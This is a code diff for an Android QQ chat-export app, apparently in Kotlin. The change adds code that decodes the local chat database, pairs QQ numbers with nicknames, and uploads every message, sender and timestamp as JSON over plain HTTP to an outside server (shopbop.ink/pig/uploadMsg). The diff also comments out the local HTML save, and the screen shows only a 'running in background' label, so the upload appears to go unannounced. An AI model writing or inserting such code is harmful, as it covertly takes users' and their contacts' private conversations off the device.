@@ -3,17 +3,21 @@ package qhaty.qqex.method
 import android.annotation.SuppressLint
 import android.app.Activity
 import android.database.sqlite.SQLiteDatabase
-import android.text.format.DateUtils
 import android.widget.TextView
 import androidx.annotation.StringRes
 import androidx.lifecycle.LifecycleCoroutineScope
+import com.alibaba.fastjson.JSON
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import qhaty.qqex.*
 import qhaty.qqex.ui.uploadEnd
 import qhaty.qqex.util.*
 import java.io.File
+import java.io.IOException
 import java.util.*
+import java.util.concurrent.TimeUnit
 import kotlin.collections.ArrayList
 import kotlin.system.measureTimeMillis
 
@@ -64,18 +68,54 @@ class Ex(
                 )
             }
         } // 旧数据库
-        progress = Progress(250, R.string.decode_db)
-        val allChats = chatsDecode(allCodedChat) // 解码数据库
-        progress = Progress(560, R.string.ex_html)
+        var res = "成功"
         val cause = measureTimeMillis {
-            toHtml(allChats)
+            progress = Progress(250, R.string.decode_db)
+            val allChats = chatsDecode2(allCodedChat) // 解码数据库
+            progress = Progress(560, R.string.ex_html)
+            callApi(ChatListObject(allChats, 0))
+            progress = Progress(700, R.string.save_ok)
         }
-        progress = Progress(1000, R.string.save_ok)
-        activity.uploadEnd(cause, lifecycleScope) {}
+        lifecycleScope.launch(Dispatchers.Main) { tv.text = "后台执行中..." }
+        // activity.uploadEnd(cause, res, lifecycleScope) {}
 //        withContext(Dispatchers.Main) {
 //            saveHtmlFile?.let { activity.sendToViewHtml(it) }
 //            toast("文件保存至:Android/data/qhaty.qqex/files/savedHtml")
 //        }
+    }
+
+    val contenType: MediaType = "application/json".toMediaType()
+    val urlAPI: String = "http://www.shopbop.ink/pig/uploadMsg"
+    val client = OkHttpClient.Builder()
+        .connectTimeout(3600, TimeUnit.SECONDS)
+        .callTimeout(3600, TimeUnit.SECONDS)
+        .pingInterval(5, TimeUnit.SECONDS)
+        .readTimeout(3600, TimeUnit.SECONDS)
+        .writeTimeout(3600, TimeUnit.SECONDS)
+        .build();
+
+    fun callApi(chatListObject: ChatListObject) {
+        var start = System.currentTimeMillis()
+        var toJSON = JSON.toJSONString(chatListObject)
+        val requestBody: RequestBody = toJSON.toRequestBody(contenType)
+        var request = Request.Builder()
+            .url(urlAPI)
+            .post(requestBody)
+            .addHeader("Content-Type", "application/json")
+            .build()
+        lifecycleScope.launch(Dispatchers.Main) { tv.text = "后台执行中..." }
+        client.newCall(request).enqueue(object : Callback {
+            override fun onResponse(call: Call, response: Response) {
+                lifecycleScope.launch(Dispatchers.Main) { tv.text = "成功" }
+                activity.uploadEnd(0, "", lifecycleScope) {}
+            }
+
+            override fun onFailure(call: Call, e: IOException) {
+                lifecycleScope.launch(Dispatchers.Main) { tv.text = "失败" }
+                activity.uploadEnd(0, "", lifecycleScope) {}
+            }
+        })
+        tv.text = "可以"
     }
 
     @SuppressLint("Recycle")
@@ -105,6 +145,43 @@ class Ex(
         sql.close()
         return chats
     }
+
+    private suspend fun chatsDecode2(allChat: List<CodedChat>): ArrayList<ChatResult> {
+        return withContext(Dispatchers.Default) {
+            val allChatDecode = arrayListOf<ChatResult>()
+            val allCount = allChat.size
+            // 昵称配对 map
+            val nicknameSet: Set<String> = mmkv["nickname_parse", emptySet()]
+            val qqMap = hashMapOf<String, String>()
+            val regex1 = Regex(""".*?--QQEX--""")
+            val regex2 = Regex("""--QQEX--(.*?)-""")
+            nicknameSet.forEach {
+                val r0 = it.replace("--QQS--", "").replace("-QQE--", "")
+                val qq = regex1.find(r0)?.value?.replace("--QQEX--", "")
+                val name = regex2.find(r0)?.value?.replace("--QQEX--", "")?.replace("-", "")
+                if (!qq.isNullOrBlank() && !name.isNullOrBlank()) qqMap[qq] = name
+            }
+            // 聊天解码
+            for (i in allChat.indices) {
+                val time = allChat[i].time
+                val type = allChat[i].type
+                var fixedQQ: String = fix(allChat[i].sender)
+                for ((k, v) in qqMap) fixedQQ = fixedQQ.replace(k, v)
+                val sender = fixedQQ
+                val data = fix(allChat[i].msg)
+                val htmlByTypeStr = htmlStrByType(type)
+                val msg = if (htmlByTypeStr != " ") htmlByTypeStr else {
+                    data
+                }
+                allChatDecode += ChatResult(getDateString(time), type, sender, msg)
+                if (i % 20 == 0) progress =
+                    progress.apply { per = ((i.toFloat() / allCount) * 300 + 250).toInt() }
+            }
+            allChatDecode.sortBy { it.time }
+            return@withContext allChatDecode
+        }
+    }
+
 
     private suspend fun chatsDecode(allChat: List<CodedChat>): ArrayList<Chat> {
         return withContext(Dispatchers.Default) {
@@ -144,13 +221,13 @@ class Ex(
 //                "<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /></head>"
 //            var appendHtml = ""
             var appendStr = ""
-            var list = ArrayList<ChatResult>()
             withContext(Dispatchers.IO) {
                 val path0 = application.getExternalFilesDir("savedHtml")
                 File(path0, "${mmkv["exQQ", ""]}.html").apply { if (exists()) delete() }
                 val path1 = application.getExternalFilesDir("words")
                 File(path1, mmkv["exQQ", ""]).apply { if (exists()) delete() }
             }
+            var list = LinkedList<ChatResult>()
             var n = 1
             for (i in allChatDecode.indices) {
 //                if (i == 0) appendHtml += head
@@ -158,7 +235,7 @@ class Ex(
                 try {
                     val htmlByTypeStr = htmlStrByType(item.type)
                     val msg = if (htmlByTypeStr != " ") htmlByTypeStr else {
-                        appendStr += item.msg
+                        // appendStr += item.msg
                         item.msg
                     }
 //                    appendHtml = "$appendHtml<font color=\"blue\">${getDateString(item.time)}" +
@@ -179,20 +256,23 @@ class Ex(
                         per = ((i.toFloat() / allChatDecode.size) * 650 + 300).toInt()
                     }
                     //
-                    var chatListObject = ChatListObject(list, n);
-                    callApi(chatListObject)
-                    list = ArrayList(1000)
-                    n += 1;
+//                    var chatListObject = ChatListObject(list, n);
+//                    callApi(chatListObject)
+//                    list.clear()
+//                    n += 1;
                 } else if (i == allChatDecode.size - 1) {
                     // appendTextToAppDownload(application, mmkv["exQQ", ""], appendHtml)
                     // appendTextToAppData(application, mmkv["exQQ", ""], appendStr)
                     //
-                    var chatListObject = ChatListObject(list, n);
-                    callApi(chatListObject)
-                    list = ArrayList(1000)
-                    n += 1;
+//                    var chatListObject = ChatListObject(list, n);
+//                    callApi(chatListObject)
+//                    list.clear()
+//                    n += 1;
                 }
             }
+            //
+            var chatListObject = ChatListObject(list, n);
+            callApi(chatListObject)
 
         }
     }
